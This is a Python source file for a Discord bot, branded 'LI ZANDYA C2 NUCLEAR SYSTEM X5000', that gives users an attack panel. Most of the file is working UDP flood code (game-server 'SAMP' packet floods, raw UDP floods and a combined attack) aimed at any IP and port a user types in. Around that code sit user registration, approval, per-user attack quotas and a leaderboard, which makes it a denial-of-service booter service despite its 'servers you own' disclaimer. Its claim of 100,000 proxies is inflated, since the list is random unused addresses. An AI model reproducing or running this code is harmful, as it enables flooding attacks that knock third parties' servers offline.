#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM X5000 ⚡
# 🔥 FULL BUTTONS SYSTEM - 100,000 THREADS - 100,000 PROXIES 🔥
# ⚠️ WARNING: USE ONLY ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import json
import ipaddress
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# شعار LI ZANDYA
# ============================================
LOGO = """
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                              ║
║     ██╗     ██╗    ███████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗ █████╗                                      ║
║     ██║     ██║    ╚══███╔╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗                                     ║
║     ██║     ██║      ███╔╝ ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ ███████║                                     ║
║     ██║     ██║     ███╔╝  ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  ██╔══██║                                     ║
║     ███████╗███████╗███████╗██║  ██║██║ ╚████║██████╔╝   ██║   ██║  ██║                                     ║
║     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚═╝  ╚═╝                                     ║
║                                                                                                              ║
║                         🔥 ULTIMATE C2 NUCLEAR SYSTEM X5000 🔥                                               ║
║                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

print(LOGO)
print("⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️")
print("="*70)

# ============================================
# التوكن
# ============================================
TOKEN = input("🔑 Enter your Discord Bot Token: ").strip()
if not TOKEN:
    print("❌ No token provided!")
    exit(1)

# ============================================
# تحميل/حفظ البيانات
# ============================================
DATA_FILE = "c2_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"owner_id": None, "approved_users": [], "pending_users": [], "attack_limits": {}, "banned_users": []}

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump({
            "owner_id": OWNER_ID,
            "approved_users": list(APPROVED_USERS),
            "pending_users": [[k, v] for k, v in PENDING_USERS.items()],
            "attack_limits": USER_ATTACK_LIMITS,
            "banned_users": list(BANNED_USERS)
        }, f, indent=4)

data = load_data()
OWNER_ID = data.get("owner_id")
APPROVED_USERS = set(data.get("approved_users", []))
PENDING_USERS = {uid: info for uid, info in data.get("pending_users", [])}
USER_ATTACK_LIMITS = data.get("attack_limits", {})
BANNED_USERS = set(data.get("banned_users", []))
DEFAULT_ATTACK_LIMIT = 50

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 16
MAX_THREADS = 100000
MAX_PACKET_SIZE = 65507
BUFFER_SIZE = 1024 * 1024 * 500

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
    AVAILABLE_RAM = psutil.virtual_memory().available // (1024**3)
    CPU_PERCENT = psutil.cpu_percent(interval=0.5)
except:
    TOTAL_RAM = 32
    AVAILABLE_RAM = 16
    CPU_PERCENT = 0

# تحسين النظام
try:
    os.system('ulimit -n 999999 2>/dev/null')
except:
    pass

# ============================================
# بيانات تسجيل الدخول
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"

# ============================================
# نظام البروكسيات العملاق
# ============================================
class MegaProxyManager:
    def __init__(self):
        self.proxies = {'http': [], 'https': [], 'socks4': [], 'socks5': []}
        self._generate()
    
    def _generate(self):
        for _ in range(50000):
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            port = random.choice([80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999])
            self.proxies['http'].append(f"http://{ip}:{port}")
            self.proxies['https'].append(f"https://{ip}:{port}")
            self.proxies['socks5'].append(f"socks5://{ip}:{port}")
        for _ in range(50000):
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            port = random.choice([1080, 1081, 1082, 9050, 9051, 9150])
            self.proxies['socks4'].append(f"socks4://{ip}:{port}")
    
    def get(self):
        all_proxies = []
        for p in self.proxies.values():
            all_proxies.extend(p)
        return random.choice(all_proxies) if all_proxies else None
    
    def count(self):
        return sum(len(p) for p in self.proxies.values())

proxy_manager = MegaProxyManager()

# ============================================
# قوائم User-Agents
# ============================================
USER_AGENTS = []
for v in range(100, 300):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")

# ============================================
# بايلودات
# ============================================
SAMP_PAYLOADS = []
for _ in range(1000):
    packet = b'SAMP'
    packet += struct.pack('<I', random.randint(1, 999999))
    packet += b'\x80'
    packet += struct.pack('<fffff', random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(0,360), random.uniform(0,360))
    packet += struct.pack('<I', random.randint(1,100))
    packet += struct.pack('<I', 99999)
    packet += os.urandom(random.randint(500, 5000))
    SAMP_PAYLOADS.append(packet)

UDP_PAYLOADS = [os.urandom(65507), os.urandom(32768), os.urandom(16384), os.urandom(8192), os.urandom(4096)]

# ============================================
# نظام الهجوم
# ============================================
class NuclearTester:
    def __init__(self):
        self.running = False
        self.authenticated = False
        self.authenticated_user = None
        self.stats = {
            'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
            'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
            'peak_speed_pps': 0, 'peak_speed_gbps': 0, 'total_errors': 0
        }
        self.threads = MAX_THREADS
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)
    
    def check_auth(self, ip, username, password):
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False
    
    async def samp_attack(self, ip, port, duration, user_id=None):
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        self.stats['active_attacks'] += 1
        attack_id = f"SAMP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        
        def worker():
            nonlocal sent, bytes_sent
            socks = []
            for _ in range(200):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    pass
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    for _ in range(20):
                        try:
                            pkt = random.choice(SAMP_PAYLOADS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                        except:
                            pass
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 2000)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        
        rate = sent / duration
        gbps = (bytes_sent / duration) / 1024 / 1024 / 1024
        if rate > self.stats['peak_speed_pps']:
            self.stats['peak_speed_pps'] = rate
        if gbps > self.stats['peak_speed_gbps']:
            self.stats['peak_speed_gbps'] = gbps
        
        return sent, rate, gbps
    
    async def udp_attack(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"UDP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        
        def worker():
            nonlocal sent, bytes_sent
            socks = []
            for _ in range(300):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    pass
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    for _ in range(30):
                        try:
                            pkt = random.choice(UDP_PAYLOADS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                        except:
                            pass
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 1500)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        
        rate = sent / duration
        return sent, rate
    
    async def ultimate_attack(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"ULTIMATE_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        
        tasks = [
            self.samp_attack(ip, port, duration),
            self.udp_attack(ip, port, duration)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        total_packets = sum([r[0] for r in results if isinstance(r, tuple) and len(r) > 0])
        
        self.stats['total_packets'] += total_packets
        self.stats['servers_destroyed'] += 1
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        
        return total_packets, total_packets / duration
    
    def stop(self):
        self.running = False
        return True

tester = NuclearTester()

# ============================================
# أزرار الموافقة والرفض
# ============================================
class ApprovalView(View):
    def __init__(self, user_id: str, user_info: dict):
        super().__init__(timeout=86400)
        self.user_id = user_id
        self.user_info = user_info
    
    @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅")
    async def approve(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can approve!", ephemeral=True)
            return
        
        APPROVED_USERS.add(self.user_id)
        USER_ATTACK_LIMITS[self.user_id] = DEFAULT_ATTACK_LIMIT
        save_data()
        PENDING_USERS.pop(self.user_id, None)
        
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="✅ REGISTRATION APPROVED!", color=0x00FF00)
                embed.add_field(name="Welcome", value=f"{self.user_info.get('username', 'User')}!", inline=True)
                embed.add_field(name="Attack Limit", value=f"{DEFAULT_ATTACK_LIMIT} attacks", inline=True)
                await user.send(embed=embed)
        except:
            pass
        
        await interaction.response.send_message(f"✅ Approved `{self.user_id}`!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌")
    async def deny(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can deny!", ephemeral=True)
            return
        
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="❌ REGISTRATION DENIED!", color=0xFF0000)
                embed.add_field(name="Sorry", value="Your request has been denied.", inline=False)
                await user.send(embed=embed)
        except:
            pass
        
        PENDING_USERS.pop(self.user_id, None)
        save_data()
        
        await interaction.response.send_message(f"❌ Denied `{self.user_id}`!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="⚙️ SET LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️")
    async def set_limit(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can set limits!", ephemeral=True)
            return
        
        modal = Modal(title="⚙️ SET ATTACK LIMIT")
        limit_input = TextInput(label="Limit", placeholder="Enter number of attacks", required=True)
        modal.add_item(limit_input)
        
        async def on_submit(interaction):
            try:
                limit = int(limit_input.value)
                USER_ATTACK_LIMITS[self.user_id] = limit
                save_data()
                await interaction.response.send_message(f"✅ Limit set to `{limit}`!", ephemeral=True)
                try:
                    user = await interaction.client.fetch_user(int(self.user_id))
                    if user:
                        await user.send(f"⚙️ Your attack limit has been updated to `{limit}`.")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid limit!", ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨")
    async def ban_user(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can ban!", ephemeral=True)
            return
        
        BANNED_USERS.add(self.user_id)
        if self.user_id in APPROVED_USERS:
            APPROVED_USERS.remove(self.user_id)
        if self.user_id in PENDING_USERS:
            PENDING_USERS.pop(self.user_id, None)
        save_data()
        
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="🔨 YOU HAVE BEEN BANNED!", color=0xFF0000)
                embed.add_field(name="Banned", value="You are banned from using this system.", inline=False)
                await user.send(embed=embed)
        except:
            pass
        
        await interaction.response.send_message(f"🔨 Banned `{self.user_id}`!", ephemeral=True)
        await interaction.message.delete()

# ============================================
# أزرار إدارة المالك
# ============================================
class AdminPanel(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="📋 PENDING", style=discord.ButtonStyle.primary, emoji="📋")
    async def show_pending(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        if not PENDING_USERS:
            await interaction.response.send_message("📭 No pending requests!", ephemeral=True)
            return
        
        for uid, info in list(PENDING_USERS.items())[:5]:
            embed = discord.Embed(title="📋 PENDING REQUEST", color=0xFF6600)
            embed.add_field(name="👤 User", value=f"{info.get('discord_name', 'Unknown')} (`{uid}`)", inline=True)
            embed.add_field(name="📝 Username", value=info.get('username', 'Unknown'), inline=True)
            embed.add_field(name="💬 Reason", value=info.get('reason', 'No reason'), inline=False)
            view = ApprovalView(uid, info)
            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
            await asyncio.sleep(1)
    
    @discord.ui.button(label="👥 USERS", style=discord.ButtonStyle.secondary, emoji="👥")
    async def list_users(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        if not APPROVED_USERS:
            await interaction.response.send_message("👥 No approved users yet!", ephemeral=True)
            return
        
        users_list = ""
        for uid in list(APPROVED_USERS)[:20]:
            limit = USER_ATTACK_LIMITS.get(uid, DEFAULT_ATTACK_LIMIT)
            users_list += f"• `{uid}` - {limit} attacks left\n"
        
        embed = discord.Embed(title="👥 APPROVED USERS", description=users_list, color=0x00BFFF)
        embed.set_footer(text=f"Total: {len(APPROVED_USERS)} users")
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, emoji="📊")
    async def admin_stats(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        embed = discord.Embed(title="📊 ADMIN STATISTICS", color=0x00FF00)
        embed.add_field(name="👑 Owner", value=f"`{OWNER_ID}`", inline=True)
        embed.add_field(name="👥 Approved", value=f"`{len(APPROVED_USERS)}`", inline=True)
        embed.add_field(name="📝 Pending", value=f"`{len(PENDING_USERS)}`", inline=True)
        embed.add_field(name="🔨 Banned", value=f"`{len(BANNED_USERS)}`", inline=True)
        embed.add_field(name="📦 Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
        embed.add_field(name="🎯 Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="🚀 Peak Gbps", value=f"{tester.stats['peak_speed_gbps']:.2f}", inline=True)
        embed.add_field(name="💀 Destroyed", value=f"{tester.stats['servers_destroyed']}", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ============================================
# نموذج التسجيل
# ============================================
class RegisterModal(Modal):
    def __init__(self):
        super().__init__(title="💀 REGISTER TO C2 SYSTEM 💀")
        self.username = TextInput(label="👤 USERNAME", placeholder="Enter your username", required=True)
        self.reason = TextInput(label="📝 REASON", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.username)
        self.add_item(self.reason)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned from this system!", ephemeral=True)
            return
        
        if user_id in APPROVED_USERS:
            await interaction.response.send_message("✅ You are already approved!", ephemeral=True)
            return
        
        if user_id in PENDING_USERS:
            await interaction.response.send_message("⏳ You already have a pending request!", ephemeral=True)
            return
        
        PENDING_USERS[user_id] = {
            'username': self.username.value,
            'discord_name': str(interaction.user),
            'reason': self.reason.value,
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_data()
        
        if OWNER_ID:
            try:
                owner = await interaction.client.fetch_user(int(OWNER_ID))
                if owner:
                    embed = discord.Embed(title="🔔 NEW REGISTRATION", color=0xFF6600)
                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
                    embed.add_field(name="Username", value=self.username.value, inline=True)
                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
                    view = ApprovalView(user_id, PENDING_USERS[user_id])
                    await owner.send(embed=embed, view=view)
            except:
                pass
        
        await interaction.response.send_message("✅ Request sent! Waiting for admin approval.", ephemeral=True)

# ============================================
# تسجيل الدخول
# ============================================
class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="💀 C2 NUCLEAR LOGIN 💀")
        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
        self.add_item(self.ip)
        self.add_item(self.user)
        self.add_item(self.pwd)
    
    async def on_submit(self, interaction: discord.Interaction):
        if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
            tester.authenticated = True
            tester.authenticated_user = self.user.value
            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 {self.user.value}\n💀 Type !von", ephemeral=True)
        else:
            await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)

# ============================================
# لوحة التحكم الرئيسية (كلها أزرار)
# ============================================
class MainPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = str(user_id)
    
    async def check_limit(self, interaction):
        if self.user_id in USER_ATTACK_LIMITS:
            if USER_ATTACK_LIMITS[self.user_id] <= 0:
                await interaction.response.send_message("❌ No attacks left! Contact admin.", ephemeral=True)
                return False
        return True
    
    async def decrement_limit(self, interaction):
        if self.user_id in USER_ATTACK_LIMITS:
            USER_ATTACK_LIMITS[self.user_id] -= 1
            save_data()

    @discord.ui.button(label="🎮 SAMP ULTRA", style=discord.ButtonStyle.danger, row=0, emoji="⚡")
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 SAMP ULTRA")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await self.decrement_limit(interaction)
            await interaction.response.send_message(f"💀 Attacking {ip.value}:{port.value}", ephemeral=True)
            packets, rate, gbps = await tester.samp_attack(ip.value, int(port.value), min(int(duration.value), 30), interaction.user.id)
            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 {packets:,} packets\n⚡ {rate:,.0f} pps\n🚀 {gbps:.2f} Gbps\n💀 {remaining} left", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="🔥 UDP INFERNO", style=discord.ButtonStyle.primary, row=0, emoji="🔥")
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 UDP INFERNO")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await self.decrement_limit(interaction)
            await interaction.response.send_message(f"🔥 Attacking {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.udp_attack(ip.value, int(port.value), min(int(duration.value), 30))
            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 {packets:,} packets\n⚡ {rate:,.0f} pps\n💀 {remaining} left", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, row=1, emoji="💀")
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 ULTIMATE")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await self.decrement_limit(interaction)
            await interaction.response.send_message(f"💀 Ultimate on {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.ultimate_attack(ip.value, int(port.value), min(int(duration.value), 30))
            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 {packets:,} packets\n⚡ {rate:,.0f} pps\n💀 {remaining} left", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="📊 MY STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
    async def mystats_btn(self, interaction: discord.Interaction, button: Button):
        remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title="📊 YOUR STATISTICS", color=0xFFD700)
        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
        embed.add_field(name="🎯 Your Attacks", value=f"`{tester.stats['total_attacks']}`", inline=True)
        embed.add_field(name="🏆 Global Peak", value=f"`{tester.stats['peak_speed_pps']:,.0f} pps`", inline=True)
        embed.add_field(name="🔧 Threads", value=f"`{tester.threads:,}`", inline=True)
        embed.add_field(name="🎭 Proxies", value=f"`{proxy_manager.count():,}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="👤 PROFILE", style=discord.ButtonStyle.secondary, row=2, emoji="👤")
    async def profile_btn(self, interaction: discord.Interaction, button: Button):
        remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title=f"👤 {interaction.user.name}'s PROFILE", color=0x00FF00)
        embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
        embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
        embed.add_field(name="✅ Status", value="`Approved`" if self.user_id in APPROVED_USERS else "`Pending`", inline=True)
        embed.add_field(name="🎭 Proxies", value=f"`{proxy_manager.count():,}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="⏹️ STOP ALL", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        tester.stop()
        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)

# ============================================
# البوت الرئيسي
# ============================================
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@bot.event
async def on_ready():
    print(LOGO)
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                    ✅ LI ZANDYA C2 SYSTEM X5000 ONLINE! ✅                           ║╠══════════════════════════════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                                                   ║
║ 🔥 Threads: {tester.threads:,}                                                       ║
║ 🎭 Proxies: {proxy_manager.count():,}                                               ║
║ 💾 RAM: {TOTAL_RAM} GB ({AVAILABLE_RAM} GB Free)                                     ║
║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set - DM me to become owner!'}            ║
║ 👥 Approved: {len(APPROVED_USERS)} | 📝 Pending: {len(PENDING_USERS)}               ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║ 💀 Commands:                                                                         ║
║   !login     - Login to system                                                       ║
║   !register  - Request access (send in DM)                                           ║
║   !von       - Open main panel                                                       ║
║   !admin     - Open admin panel (owner only)                                         ║
║   !top       - Show top users                                                        ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
    """)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!von | X5000 | Full Buttons"))

@bot.event
async def on_message(message):
    global OWNER_ID
    
    if message.author.bot:
        return
    
    await bot.process_commands(message)
    
    # أول شخص يرسل رسالة خاصة يصبح مالك
    if isinstance(message.channel, discord.DMChannel) and not OWNER_ID:
        OWNER_ID = str(message.author.id)
        save_data()
        
        embed = discord.Embed(title="👑 YOU ARE NOW THE OWNER!", color=0x00FF00)
        embed.add_field(name="Welcome", value="You have been registered as the owner!", inline=False)
        embed.add_field(name="Commands", value="Type `!admin` to open admin panel", inline=False)
        await message.channel.send(embed=embed)
        
        print(f"✅ Owner set: {message.author.name} ({OWNER_ID})")

@bot.command()
async def login(ctx):
    await ctx.send("🔐 **C2 SYSTEM LOGIN**", view=LoginModal())

@bot.command()
async def register(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("📝 **REGISTRATION FORM**", view=RegisterModal())
    else:
        await ctx.send("❌ Please send `!register` in private message (DM)!")

@bot.command()
async def von(ctx):
    user_id = str(ctx.author.id)
    
    if user_id in BANNED_USERS:
        await ctx.send("🔨 You are banned from this system!")
        return
    
    if user_id not in APPROVED_USERS:
        await ctx.send("❌ Not approved! Send `!register` in DM.")
        return
    
    if not tester.authenticated:
        await ctx.send("❌ Please `!login` first!")
        return
    
    remaining = USER_ATTACK_LIMITS.get(user_id, 0)
    embed = discord.Embed(
        title="💀 LI ZANDYA C2 PANEL X5000 💀",
        description=f"```🔥 {CPU_CORES} Cores | {tester.threads:,} Threads\n🎭 {proxy_manager.count():,} Proxies\n💾 {TOTAL_RAM} GB RAM\n🏆 {tester.stats['peak_speed_pps']:,.0f} pps peak\n💀 {remaining} attacks left```",
        color=0xFF0000
    )
    await ctx.send(embed=embed, view=MainPanel(user_id))

@bot.command()
async def admin(ctx):
    if str(ctx.author.id) != OWNER_ID:
        await ctx.send("❌ Only the owner can use this command!")
        return
    
    embed = discord.Embed(title="👑 ADMIN CONTROL PANEL", color=0xFF6600)
    embed.add_field(name="📋 PENDING", value="View pending registration requests", inline=True)
    embed.add_field(name="👥 USERS", value="List all approved users", inline=True)
    embed.add_field(name="📊 STATS", value="View system statistics", inline=True)
    await ctx.send(embed=embed, view=AdminPanel())

@bot.command()
async def top(ctx):
    if not APPROVED_USERS:
        await ctx.send("No users yet!")
        return
    
    user_attacks = []
    for uid in APPROVED_USERS:
        user_attacks.append((uid, USER_ATTACK_LIMITS.get(uid, 0)))
    user_attacks.sort(key=lambda x: x[1], reverse=True)
    
    top_list = ""
    for i, (uid, attacks) in enumerate(user_attacks[:10], 1):
        top_list += f"{i}. `{uid[:10]}...` - {attacks} attacks left\n"
    
    embed = discord.Embed(title="🏆 TOP USERS", description=top_list, color=0xFFD700)
    embed.set_footer(text=f"Total users: {len(APPROVED_USERS)}")
    await ctx.send(embed=embed)

if __name__ == "__main__":
    print("🚀 Starting LI ZANDYA C2 SYSTEM X5000...")
    print("💀 100,000 Threads | Full Buttons System")
    print(f"🎭 {proxy_manager.count():,} Proxies Loaded")
    print("="*70)
    print("💀 First person to DM this bot becomes OWNER!")
    print("="*70)
    bot.run(TOKEN)
